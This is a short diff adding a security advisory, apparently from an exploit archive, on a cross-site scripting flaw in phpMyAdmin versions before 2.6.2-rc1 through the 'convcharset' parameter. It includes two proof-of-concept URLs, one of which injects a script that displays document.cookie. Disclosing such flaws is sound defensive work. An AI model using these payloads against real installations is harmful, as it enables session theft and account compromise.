@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/12982/info
+
+phpMyAdmin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input to the 'convcharset' parameter.
+
+phpMyAdmin versions prior to 2.6.2-rc1 are affected by this issue. 
+
+http://www.example.com/phpmyadmin/index.php?pma_username=&pma_password=&server=1&lang=en-iso-8859-1&convcharset=\"><script>alert(document.cookie)</script>
+
+http://www.example.com/phpmyadmin/index.php?pma_username=&pma_password=&server=1&lang=en-iso-8859-1&convcharset=\"><h1>XSS</h1> 
